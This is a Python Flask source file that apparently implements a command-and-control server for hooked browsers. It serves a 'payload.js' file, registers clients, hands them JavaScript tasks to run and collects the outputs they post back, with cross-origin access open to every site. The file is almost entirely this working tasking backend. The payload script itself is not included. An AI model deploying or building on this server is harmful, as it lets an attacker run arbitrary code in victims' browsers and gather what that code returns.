#!/usr/bin/python
from flask import Flask, jsonify, abort, make_response, g, request
from flask.ext.cors import CORS
import sqlite3
from flask_sqlalchemy import SQLAlchemy
from collections import OrderedDict

DATABASE = 'tasks.db'
app = Flask(__name__)
cors = CORS(app, resources={r"/api/*": {"origins": "*"}})

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///tasks.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

#db config


class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    input = db.Column(db.Text)
    output = db.Column(db.Text)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    client = db.relationship('Client',
        backref=db.backref('tasks', lazy='dynamic'))
    def __init__(self, client, input, output=None):
        self.client = client
        self.input = input
        self.output = output
    def __repr__(self):
        return '<Task %r>' % self.id
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result
class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    def __repr__(self):
        return '<Client %r>' % self.id 
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result
db.drop_all()
db.create_all()
@app.route('/payload.js', methods=['GET'])
def returnJS():
    return open("payload.js").read()
    
@app.route('/api/register', methods=['GET'])
def register():
    myclient = Client()
    db.session.add(myclient)
    db.session.commit()
    print 'test db output: '+str(myclient.id)
    print 'registering client: '+str(myclient.id)
    return jsonify({'clientid': myclient.id}), 201
    

@app.route('/api/tasks/<int:client_id>', methods=['GET'])
def gettasks(client_id):
    print 'sending tasks for client ID: '+str(client_id)
    myclient = Client.query.filter_by(id=client_id).first()
    tasklist = Task.query.filter(Task.client==myclient,Task.output.is_(None)).all()
    tasks = []
    for task in tasklist:
        tasks.append({'id':task.id,'input':task.input})
    print tasks
    return jsonify({'tasks': tasks}), 201 #replace with db eventually

@app.route('/api/tasks/<int:task_id>', methods=['POST'])
def recievetasks(task_id):
    if not request.json:
        print request
        abort(400)

    for task in request.json['tasks']:

        mytask = Task.query.filter_by(id=task_id).first()
        mytask.output=str(task['output'])
        print 'OUTPUTTTTTT: '+mytask.output
        #db.session.merge(mytask)
        db.session.commit()
        print 'recieved output for taskid: '+str(task_id)

    return jsonify({'result': True}), 201
    
@app.route('/api/adddummytask/<int:client_id>', methods=['GET'])
def addtask(client_id):
    myclient = Client.query.filter_by(id=client_id).first()
    mytask = Task(myclient,"1+1;") 
    db.session.add(mytask)
    db.session.commit()
    return jsonify({'result': True}), 201       
if __name__ == '__main__':
    app.run(debug=True)
    